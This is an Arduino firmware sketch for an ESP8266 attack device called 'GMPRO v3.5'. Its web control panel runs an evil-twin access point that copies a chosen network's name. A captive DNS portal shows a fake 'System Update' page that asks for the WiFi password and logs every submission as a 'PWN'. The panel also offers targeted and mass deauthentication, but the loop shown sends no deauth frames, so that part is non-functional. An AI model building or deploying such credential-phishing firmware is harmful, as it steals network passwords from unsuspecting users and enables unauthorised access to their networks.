#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;

bool isAttacking = false;
bool isEvilTwinActive = false;
bool isHidden = true; 
String target_ssid = "";
int target_ch = 1;
String logs = "";
int pwnCount = 0;
String apSSID = "GMpro";
String apPASS = "sangkur87";

void randomizeMAC() {
  uint8_t mac[6] = {0x00, 0x16, 0x3E, (uint8_t)random(0xff), (uint8_t)random(0xff), (uint8_t)random(0xff)};
  wifi_set_macaddr(SOFTAP_IF, mac);
}

void updateOLED(String status) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("GMPRO v3.5");
  display.println("==========");
  display.print("T:"); display.println(target_ssid == "" ? "NONE" : target_ssid.substring(0,8));
  display.print("H:"); display.println(isHidden ? "ON" : "OFF");
  display.print("PWN:"); display.println(pwnCount);
  display.print("ST:"); display.println(status);
  display.display();
}

void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT); 
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  randomizeMAC(); 
  WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
  dnsServer.start(53, "*", WiFi.softAPIP());
  updateOLED(isHidden ? "GHOST" : "READY");

  server.on("/", []() {
    String s = "<html><head><meta http-equiv='refresh' content='7'><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
    s += "body{background:#000;color:#0f0;font-family:monospace;padding:10px;}";
    s += ".b{border:1px solid #444;padding:12px;display:block;margin:10px 0;color:#0f0;text-decoration:none;text-align:center;background:#111;border-radius:5px;}";
    s += ".active{border-color:#f00; background:#300; color:#fff;} h1{text-align:center;margin:0;}";
    s += ".tgl{color:#fff;background:#444;padding:5px 10px;border-radius:3px;text-decoration:none;font-size:11px;border:1px solid #0f0;}";
    s += "</style></head><body>";
    s += "<h1>GMPRO v3.5</h1>";
    s += "<div style='text-align:right;margin-bottom:10px;'><a href='/toggle_hidden' class='tgl'>GHOST MODE: " + String(isHidden?"ON":"OFF") + "</a></div>";
    s += "<div style='border:1px solid #333;padding:10px;margin-bottom:10px;'>";
    s += "TARGET: " + (target_ssid=="" ? "NONE" : target_ssid) + "<br>";
    s += "CH: " + String(target_ch) + " | ATK: " + (isAttacking?"<b style='color:red;'>RUNNING</b>":"IDLE") + "</div>";
    s += "<a href='/scan' class='b'>[1] SCAN TARGET</a>";
    s += "<a href='/eviltwin' class='b " + String(isEvilTwinActive?"active":"") + "' style='color:#0ff;'>[2] EVIL TWIN</a>";
    s += "<a href='/attack' class='b " + String(isAttacking && target_ssid != "ALL"?"active":"") + "' style='color:#f44;'>[3] DEAUTH TARGET</a>";
    s += "<a href='/mass' class='b " + String(target_ssid == "ALL"?"active":"") + "' style='color:#f0f;'>[4] MASS DEAUTH</a>";
    s += "<h3>PWN LOGS ("+String(pwnCount)+"):</h3><div style='background:#111;padding:10px;font-size:11px;border:1px solid #333;height:100px;overflow-y:auto;'>" + (logs=="" ? "LISTENING..." : logs) + "</div>";
    s += "</body></html>";
    server.send(200, "text/html", s);
  });

  server.on("/toggle_hidden", []() {
    isHidden = !isHidden;
    WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
    updateOLED(isHidden ? "GHOST" : "VISIBLE");
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/scan", []() {
    int n = WiFi.scanNetworks();
    String sc = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:15px;'><h2>NETWORKS</h2>";
    for(int i=0; i<n; i++) {
      String ssid = WiFi.SSID(i);
      if(ssid == "") ssid = "[HIDDEN]";
      sc += "<div><b>" + ssid + "</b> (" + String(WiFi.RSSI(i)) + "dBm)<br>";
      sc += "CH: " + String(WiFi.channel(i)) + " | " + WiFi.BSSIDstr(i) + "<br>";
      sc += "<a href='/select?s=" + ssid + "&c=" + String(WiFi.channel(i)) + "' style='color:#fff;'>[SELECT]</a></div><hr>";
    }
    sc += "<br><a href='/' style='color:#0f0;'>[ BACK ]</a></body></html>";
    server.send(200, "text/html", sc);
  });

  server.on("/select", []() {
    target_ssid = server.arg("s");
    target_ch = server.arg("c").toInt();
    updateOLED("LOCKED");
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/eviltwin", []() {
    if (!isEvilTwinActive && target_ssid != "") {
      WiFi.softAP(target_ssid.c_str(), "", 1, 0); 
      isEvilTwinActive = true;
      updateOLED("ETWIN");
    } else {
      WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); 
      isEvilTwinActive = false;
      updateOLED(isHidden ? "GHOST" : "READY");
    }
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/attack", [](){ isAttacking = !isAttacking; updateOLED(isAttacking?"DEAUTH":"IDLE"); server.sendHeader("Location", "/"); server.send(302); });

  server.on("/mass", []() {
    isAttacking = !isAttacking;
    target_ssid = isAttacking ? "ALL" : "";
    updateOLED(isAttacking ? "MASS" : "READY");
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.onNotFound([]() {
    String login = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='font-family:sans-serif;text-align:center;padding:20px;'>";
    login += "<div style='background:#f44336;color:white;padding:15px;border-radius:5px;'><h3>System Update</h3></div>";
    login += "<p>Verification needed to restore internet access.</p>";
    login += "<form action='/login'><input type='password' name='p' placeholder='WiFi Password' style='width:90%;padding:12px;' required><br><br>";
    login += "<input type='submit' value='Verify & Connect' style='width:90%;padding:12px;background:#000;color:#fff;'></form></body></html>";
    server.send(200, "text/html", login);
  });

  server.on("/login", []() {
    logs = "<b>" + target_ssid + "</b>: " + server.arg("p") + "<br>" + logs;
    pwnCount++;
    updateOLED("PWN!");
    server.send(200, "text/html", "Verifying... Success.");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (isAttacking) {
    digitalWrite(2, (millis() % 500 < 100) ? LOW : HIGH);
    if(target_ssid == "ALL") {
      static int ch = 1;
      wifi_set_channel(ch);
      ch = (ch % 13) + 1;
    } else {
      // PERBAIKAN DI SINI: scanNetworks(false)
      static unsigned long lastCheck = 0;
      if (millis() - lastCheck > 6000) {
        int n = WiFi.scanNetworks(false); // Pakai satu parameter saja
        for (int i = 0; i < n; i++) {
          if (WiFi.SSID(i) == target_ssid && WiFi.channel(i) != target_ch) {
            target_ch = WiFi.channel(i);
            break;
          }
        }
        lastCheck = millis();
      }
      wifi_set_channel(target_ch);
    }
    delay(1); 
  } else {
    digitalWrite(2, (millis() % 2000 < 100) ? LOW : HIGH); 
  }
}
